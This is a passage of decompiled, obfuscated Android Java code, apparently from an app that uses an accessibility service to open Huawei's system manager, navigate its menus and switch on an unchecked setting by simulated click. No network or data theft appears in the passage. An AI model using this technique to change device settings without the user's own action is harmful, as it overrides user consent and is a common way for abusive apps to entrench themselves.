                y(Scheduler.MAX_GREEDY_SCHEDULER_LIMIT);
            }
            v(i2 - 1);
            y(1000);
            return;
        }
        g(accessibilityNodeInfoD0.getParent().getParent().getParent());
        y(1000);
        AccessibilityNodeInfo accessibilityNodeInfoC02 = la0.c0(AccessService.e0, "com.huawei.systemmanager:id/list_arrow_more_settings");
        if (accessibilityNodeInfoC02 == null || accessibilityNodeInfoC02.getParent() == null) {
            w();
            return;
        }
        g(accessibilityNodeInfoC02.getParent().getParent());
        y(BaseConsumeOptions.DEFAULT_MESSAGE_COUNT);
        AccessibilityNodeInfo accessibilityNodeInfoC03 = la0.c0(AccessService.e0, "android:id/switch_widget");
        if (accessibilityNodeInfoC03 != null) {
            if (accessibilityNodeInfoC03.isCheckable() && !accessibilityNodeInfoC03.isChecked() && accessibilityNodeInfoC03.isClickable()) {
                accessibilityNodeInfoC03.performAction(16);
            }
            y(BaseConsumeOptions.DEFAULT_MESSAGE_COUNT);
        }
        w();
    }

    public static void w() {
        try {
            d.set(false);
            c.set(true);
            Intent intent = new Intent();
            intent.addFlags(268435456);
            intent.setClassName("com.huawei.systemmanager", "com.huawei.systemmanager.mainscreen.MainScreenActivity");
            AccessService accessService = AccessService.e0;
            if (accessService != null) {
                accessService.startActivity(intent);
            }
        } catch (Exception unused) {
        }
    }

    public static List x(String str) {
        AccessibilityNodeInfo rootInActiveWindow = AccessService.e0.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            rootInActiveWindow = AccessService.e0.getRootInActiveWindow();
        }
        if (rootInActiveWindow == null) {
            rootInActiveWindow = AccessService.e0.getRootInActiveWindow();
        }
        if (rootInActiveWindow == null) {
            rootInActiveWindow = AccessService.e0.getRootInActiveWindow();
        }
        if (rootInActiveWindow == null) {
            rootInActiveWindow = AccessService.e0.getRootInActiveWindow();
        }
        if (rootInActiveWindow == null) {
            rootInActiveWindow = AccessService.e0.getRootInActiveWindow();
        }
        if (rootInActiveWindow == null) {
            return null;
        }
        return rootInActiveWindow.findAccessibilityNodeInfosByViewId(str);
    }

    public static void y(int i2) {
        try {
            Thread.sleep(i2);
        } catch (InterruptedException e2) {
            throw new RuntimeException(e2);
        }
    }
}
